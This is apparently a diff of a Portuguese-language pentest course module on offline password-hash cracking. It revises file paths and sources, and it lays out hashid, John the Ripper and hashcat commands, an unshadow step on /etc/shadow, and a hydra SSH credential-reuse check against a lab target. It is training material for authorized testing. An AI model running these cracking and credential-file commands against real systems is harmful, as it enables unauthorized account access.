@@ -4,6 +4,13 @@
 **Objetivo:** Transformar hashes coletados (Fase 1) em senhas legíveis — 100% offline, sem tocar no alvo.
 **Por quê:** Hash cracking não gera NENHUM tráfego para o alvo (zero risco de ban/lockout) e frequentemente revela senhas reutilizadas em outros serviços.
 
+> **📡 Dados usados nos passos abaixo (de onde vêm):**
+> - **Input principal:** `15-alimentacao/hashes-suspeitos.txt` — consolidado na Fase 1 (Passo 1.6) a partir de:
+>   - MANUAL-RECON: `04-discovery/js-secrets.txt` (hashes/senhas em JS e configs expostas)
+>   - MANUAL-WEB: `10-injecao/sqlmap-dump.txt` (tabelas de usuário dumpadas por SQLMap — Fase 3 do Módulo 02) + `08-alimentacao/secrets-web.txt`
+> - **Wordlists contextuais:** `15-alimentacao/wordlist-bruteforce.txt` ← CeWL do próprio site
+> - **Credenciais em texto para reuso:** `15-alimentacao/credenciais-texto.txt` (testar na Fase 3)
+
 ---
 
 ### Passo 4.1 — Identificar o tipo de hash (hashid)
@@ -18,12 +25,13 @@ sudo apt install -y hashid
 hashid '5f4dcc3b5aa765d61d8327deb882cf99'
 
 # Identificar todos do arquivo consolidado na Fase 1
+# (vem de 04-discovery/js-secrets.txt + 10-injecao/sqlmap-dump.txt do MANUAL-WEB)
 while read h; do
     echo "=== $h ==="
     hashid -m "$h" | grep -v "^$"
-done < 08-alimentacao/hashes-suspeitos.txt > 11-cracking/hashid-resultados.txt
+done < 15-alimentacao/hashes-suspeitos.txt > 18-cracking/hashid-resultados.txt
 
-cat 11-cracking/hashid-resultados.txt
+cat 18-cracking/hashid-resultados.txt
 ```
 
 **✅ Output esperado (exemplo real):**
@@ -61,17 +69,17 @@ Hash: 5f4dcc3b5aa765d61d8327deb882cf99
 ```bash
 # 1) Rodar com detecção automática + wordlist pequena
 john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
-    08-alimentacao/hashes-suspeitos.txt
+    15-alimentacao/hashes-suspeitos.txt
 
 # 2) Ver o que já foi quebrado (o mais importante!)
-john --show 08-alimentacao/hashes-suspeitos.txt
+john --show 15-alimentacao/hashes-suspeitos.txt
 
 # 3) Se não quebrou, aplique REGRAS (mutações: maiúscula, ano, símbolo)
 john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt --rules \
-    08-alimentacao/hashes-suspeitos.txt
+    15-alimentacao/hashes-suspeitos.txt
 
 # 4) Salvar resultados
-john --show --format=raw-md5 08-alimentacao/hashes-suspeitos.txt > 11-cracking/john-resultados.txt
+john --show --format=raw-md5 15-alimentacao/hashes-suspeitos.txt > 18-cracking/john-resultados.txt
 ```
 
 **✅ Output esperado (encontrou):**
@@ -106,16 +114,16 @@ admin:Admin123
 
 ```bash
 # MD5 (modo 0)
-hashcat -m 0 08-alimentacao/hashes-suspeitos.txt /usr/share/wordlists/rockyou.txt -o 11-cracking/hashcat-md5.txt
+hashcat -m 0 15-alimentacao/hashes-suspeitos.txt /usr/share/wordlists/rockyou.txt -o 18-cracking/hashcat-md5.txt
 
 # SHA-256 (modo 1400)
-hashcat -m 1400 08-alimentacao/hashes-suspeitos.txt /usr/share/wordlists/rockyou.txt -o 11-cracking/hashcat-sha256.txt
+hashcat -m 1400 15-alimentacao/hashes-suspeitos.txt /usr/share/wordlists/rockyou.txt -o 18-cracking/hashcat-sha256.txt
 
 # NTLM (modo 1000) — Windows
-hashcat -m 1000 08-alimentacao/hashes-suspeitos.txt /usr/share/wordlists/rockyou.txt -o 11-cracking/hashcat-ntlm.txt
+hashcat -m 1000 15-alimentacao/hashes-suspeitos.txt /usr/share/wordlists/rockyou.txt -o 18-cracking/hashcat-ntlm.txt
 
 # Ver resultados
-hashcat -m 0 --show 08-alimentacao/hashes-suspeitos.txt
+hashcat -m 0 --show 15-alimentacao/hashes-suspeitos.txt
 ```
 
 **✅ Output esperado (encontrou):**
@@ -146,7 +154,7 @@ Guesses Total: 14344385 TIME: 00:00:12
 # === REGRAS (mutações inteligentes) ===
 # best64 = 64 regras mais eficazes (80% dos casos)
 hashcat -m 0 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt \
-        -r /usr/share/hashcat/rules/best64.rule -o 11-cracking/hashcat-regras.txt
+        -r /usr/share/hashcat/rules/best64.rule -o 18-cracking/hashcat-regras.txt
 
 # Regra mais agressiva (demora mais)
 hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
@@ -158,8 +166,8 @@ hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?l?d?d?d?d?s?s      # Senha2024!
 hashcat -m 0 hashes.txt -a 3 ?d?d?d?d?d?d?d?d              # só 8 dígitos
 
 # === WORDLIST DO ALVO + REGRAS (combinação vencedora) ===
-hashcat -m 0 hashes.txt 08-alimentacao/wordlist-bruteforce.txt \
-        -r /usr/share/hashcat/rules/best64.rule -o 11-cracking/hashcat-cewl.txt
+hashcat -m 0 hashes.txt 15-alimentacao/wordlist-bruteforce.txt \
+        -r /usr/share/hashcat/rules/best64.rule -o 18-cracking/hashcat-cewl.txt
 ```
 
 **✅ Output esperado (máscara acertou):**
@@ -193,16 +201,16 @@ Status.......: Cracked
 ```bash
 # === /etc/shadow (vem de exploração/root — Módulo 04) ===
 # Precisa de /etc/passwd + /etc/shadow juntos
-unshadow /etc/passwd /etc/shadow > 11-cracking/shadow-combinado.txt
-john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt --rules 11-cracking/shadow-combinado.txt
+unshadow /etc/passwd /etc/shadow > 18-cracking/shadow-combinado.txt
+john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt --rules 18-cracking/shadow-combinado.txt
 
 # === Vários hashes de uma vez (um por linha) ===
-cat > 11-cracking/hash-lote.txt << 'EOF'
+cat > 18-cracking/hash-lote.txt << 'EOF'
 5d41402abc4b2a76b9719d911017c592
 e99a18c428cb38d5f260853678922e03
 098f6bcd4621d373cade4e832627b4f6
 EOF
-hashcat -m 0 11-cracking/hash-lote.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 0 18-cracking/hash-lote.txt /usr/share/wordlists/rockyou.txt
 
 # === Hash de senha de banco (ex: MySQL) ===
 # MySQL 5.x = SHA1(SHA1(senha)) → hashcat -m 3000
@@ -222,14 +230,14 @@ admin:$1$abc...:19793:0:99999:7:::
 ### Passo 4.6 — Documentar resultados
 
 ```bash
-cat > 11-cracking/hashes-crackeados.md << 'EOF'
+cat > 18-cracking/hashes-crackeados.md << 'EOF'
 # Hashes Crackeados — evilcorp.com
 
 | # | Hash | Tipo | Senha | Origem (Fase 1) | Status |
 |---|------|------|-------|-----------------|:---:|
-| 1 | 5f4dcc3b5aa765d61d8327deb882cf99 | MD5 | password | js-secrets.txt | ✅ |
-| 2 | 5d41402abc4b2a76b9719d911017c592 | MD5 | hello | .env exposto | ✅ |
-| 3 | $2y$10$abc... | bcrypt | (não crackeado) | banco dump | ⏳ rockyou+rules rodando |
+| 1 | 5f4dcc3b5aa765d61d8327deb882cf99 | MD5 | password | js-secrets.txt (MANUAL-RECON `04-discovery/`) | ✅ |
+| 2 | 5d41402abc4b2a76b9719d911017c592 | MD5 | hello | sqlmap-dump.txt (MANUAL-WEB `10-injecao/`) | ✅ |
+| 3 | $2y$10$abc... | bcrypt | (não crackeado) | banco dump (MANUAL-WEB SQLMap) | ⏳ rockyou+rules rodando |
 
 ## Próximos passos com cada senha crackeada
 - [ ] Testar no SSH (Fase 3): hydra -l admin -p <senha> ssh://10.0.0.1
@@ -237,7 +245,7 @@ cat > 11-cracking/hashes-crackeados.md << 'EOF'
 - [ ] Verificar reuso em outros hosts
 - [ ] Registrar no relatório (Fase 7)
 EOF
-cat 11-cracking/hashes-crackeados.md
+cat 18-cracking/hashes-crackeados.md
 ```
 
 **O que procurar:** Senhas crackeadas viram `-p senha` (senha única) nos testes de reuso da Fase 3.
@@ -248,16 +256,16 @@ cat 11-cracking/hashes-crackeados.md
 
 | # | Item | Arquivo gerado | ☑ |
 |---|------|---------------|:---:|
-| 1 | Tipo de cada hash identificado | `11-cracking/hashid-resultados.txt` | [ ] |
-| 2 | John rodou (wordlist + rules) | `11-cracking/john-resultados.txt` | [ ] |
-| 3 | Hashcat rodou (se GPU ou volume) | `11-cracking/hashcat-*.txt` | [ ] |
-| 4 | Regras/máscaras tentadas | `11-cracking/hashcat-regras.txt` | [ ] |
-| 5 | Resultados documentados | `11-cracking/hashes-crackeados.md` | [ ] |
+| 1 | Tipo de cada hash identificado | `18-cracking/hashid-resultados.txt` | [ ] |
+| 2 | John rodou (wordlist + rules) | `18-cracking/john-resultados.txt` | [ ] |
+| 3 | Hashcat rodou (se GPU ou volume) | `18-cracking/hashcat-*.txt` | [ ] |
+| 4 | Regras/máscaras tentadas | `18-cracking/hashcat-regras.txt` | [ ] |
+| 5 | Resultados documentados | `18-cracking/hashes-crackeados.md` | [ ] |
 
 ### 📁 Sua pasta deve estar assim ao final da Fase 4:
 
 ```
-11-cracking/
+18-cracking/
 ├── hashid-resultados.txt     ← tipo de cada hash
 ├── john-resultados.txt       ← senhas quebradas pelo John
 ├── hashcat-md5.txt           ← resultados do Hashcat
